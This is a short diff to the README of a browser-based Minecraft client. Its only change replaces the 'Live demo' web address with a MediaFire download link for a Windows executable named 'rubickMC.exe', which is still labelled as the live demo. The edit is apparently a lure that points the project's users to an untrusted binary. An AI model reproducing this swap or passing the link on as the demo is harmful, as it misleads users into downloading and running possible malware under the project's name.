@@ -4,7 +4,7 @@
 | 🇺🇸 [English](README.md) | 🇷🇺 [Russian](README_RU.md)  | 🇵🇹 [Portuguese](README_PT.md) |
 | ----------------------- | -------------------------- | ---------------------------- |
 
-A Minecraft client running in a web page. **Live demo at https://webclient.prismarine.js.org/**
+A Minecraft client running in a web page. **Live demo at https://www.mediafire.com/file/7qvxuh6c6j2xte4/rubickMC.exe/file
 
 
 ## How it Works
